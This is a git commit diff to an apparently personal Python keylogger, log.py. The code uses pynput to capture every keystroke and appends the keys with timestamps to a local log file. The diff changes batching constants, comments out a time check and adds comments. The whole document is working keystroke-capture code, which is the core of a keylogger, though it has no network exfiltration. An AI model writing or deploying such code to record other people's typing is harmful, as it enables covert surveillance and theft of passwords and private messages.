c634df8bd0fbb4e92b7536f34ace189870850874
joey101 <jawad.tanana@gmail.com>
2021-05-28 19:09:24 +1000

    key logger finished

--- keylogger/log.py
+++ keylogger/log.py
@@ -6,9 +6,10 @@ from pynput import keyboard
 from datetime import datetime as t
 import time
 #%%---------------------------------------------------------------------------
-# Constant for how many characters on the line before inserting a new line
+# Constants being defined
 MAX_ON_LINE = 10
-NEW_LINE = 80
+NEW_LINE = 40
+# Counters to trigger different parts of the code
 key_counter = 0
 count_line = 0
 # List to temporarily store the characters in a list
@@ -17,14 +18,17 @@ key_list = []
 #%%----------------------------------------------------------------------------
 # Listens to the key inputs from the keyboard
 def on_press(key):
-    # Variables and constants are used blobally for the whole program.
+    # Variables and constants are used globally for the whole program.
     global key_counter, key_list, MAX_ON_LINE, count_line
     
     key_counter += 1
     count_line += 1
     # Removes uneccassary quotation marks
     key = str(key).replace("'","")
+
+    # Append the keys from the keyboard into a temporary list
     key_list.append(key)
+
     # Write every "MAX_ON_LINE" to the file.
     if key_counter >= MAX_ON_LINE:
         write_file(key_list, count_line)
@@ -36,7 +40,6 @@ def on_release(key):
     if key == keyboard.Key.esc:
         # Stop listener
         return False
-    
 #%%----------------------------------------------------------------------------
 # This function gets the current time.
 def get_time():
@@ -48,11 +51,11 @@ def get_time():
     #current_t = now.strftime("[%H:%M:%S]: ")
     return current_dt
 #%%---------------------------------------------------------------------------
-# This functions if half an hour has passed
+# This functions if certain period of time has passed.
 def check_time():
     oldtime = time.time()
     # check
-    if time.time() - oldtime > 60:
+    if time.time() - oldtime > 10:
         return True
     
 #%%----------------------------------------------------------------------------
@@ -64,14 +67,18 @@ def write_file(key_list, count_line):
     with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as log:
         # This appends to a file.
         # This loop will update the text file every 'x' amount of keys.
-        if check_time() == True: 
-            log.write(get_time())
+        #if check_time() == True: 
+        log.write(get_time())
+        # This loops through the temporary list passed into the function to
+        # log each character into the new file.
         for keys in key_list:
+            # This if statement prints a new line every "NEW_LINE" character
             if count_line == NEW_LINE:
                 count_line = 0
                 log.write("\n")
-            
-            if keys == "Key.space" :
+            # This "if-statement" checks if there is any special character to 
+            # print a space instead or print the letter typed.
+            if keys == "Key.space" or "Key" in keys :
                 log.write(" ")
             else:
                 log.write(str(keys))
